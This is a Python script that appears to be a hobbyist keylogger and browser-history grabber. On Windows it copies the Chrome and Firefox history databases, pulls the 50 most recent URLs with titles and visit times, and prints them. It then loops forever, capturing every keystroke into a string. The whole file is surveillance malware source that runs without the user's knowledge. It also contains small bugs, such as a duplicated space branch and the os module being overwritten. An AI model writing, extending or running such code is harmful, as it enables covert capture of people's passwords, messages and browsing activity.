import keyboard
import platform

import sqlite3
import os
import shutil
import datetime

keylog = ""
chrome_history = []
firefox_history = []

def get_history_windows():

    try:
        # Google Chrome
        google_path = os.path.join(os.environ['USERPROFILE'], r'AppData/Local/Google/Chrome/User Data/Default/History')
        
        temp_history = os.path.join(os.environ['USERPROFILE'], 'chrome_history_copy.db')
        shutil.copy2(google_path, temp_history)

        connection = sqlite3.connect(temp_history)
        cursor = connection.cursor()

        cursor.execute("""
            SELECT url, title, last_visit_time
            FROM urls
            ORDER BY last_visit_time DESC
            LIMIT 50
        """)

        for row in cursor.fetchall():
            url = row[0]
            title = row[1]
            timestamp = row[2]
            visit_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=timestamp)
            chrome_history.append(f"Visited: {url}\nTitle: {title}\nTime: {visit_time}\n")

        connection.close()
        os.remove(temp_history)
    except:
        print("google failure")

    # Google Chrome
    #
    #||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
    #||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
    #||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
    #||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
    #||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
    #||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
    #
    # Mozilla Firefox

    try:
        firefox_path = os.path.join(os.getenv('APPDATA'), r'Mozilla/Firefox/Profiles')
    
        # Find profile folder (usually ends with .default-release or .default)
        profile_folder = ''
        for folder in os.listdir(firefox_path):
            if folder.endswith('.default-release') or folder.endswith('.default'):
                profile_folder = os.path.join(firefox_path, folder)
                break

        if not profile_folder:
            return

        history_db = os.path.join(profile_folder, 'places.sqlite')
    
        # Copy database to avoid lock errors
        temp_history = 'places_copy.sqlite'
        shutil.copy2(history_db, temp_history)

        # Connect to copied database
        conn = sqlite3.connect(temp_history)
        cursor = conn.cursor()

        query = """
            SELECT 
                moz_places.url, 
                moz_places.title, 
                moz_places.visit_count, 
                moz_historyvisits.visit_date 
            FROM 
                moz_places 
            JOIN 
                moz_historyvisits 
            ON 
                moz_places.id = moz_historyvisits.place_id 
            ORDER BY 
                visit_date DESC 
            LIMIT 50;
        """

        cursor.execute(query)
        rows = cursor.fetchall()

        for url, title, count, visit_date in rows:
            # Convert Firefox timestamp (microseconds since epoch) to readable time
            visit_time = datetime.datetime(1970, 1, 1) + datetime.timedelta(microseconds=visit_date)
            firefox_history.append(f"{visit_time} | {title} | {url} (Visited {count} times)")

        # Clean up
        conn.close()
        os.remove(temp_history)
    except:
        print("firefox failure")

os = platform.system()

if os == "Windows":
    get_history_windows()
    print(chrome_history)
    print(firefox_history)

while True:
    event = keyboard.read_event()
    if event.event_type == keyboard.KEY_DOWN:

        if event.name == "space":
            keylog += " "
        elif event.name == "space":
            keylog += " "
        else:
            keylog += event.name
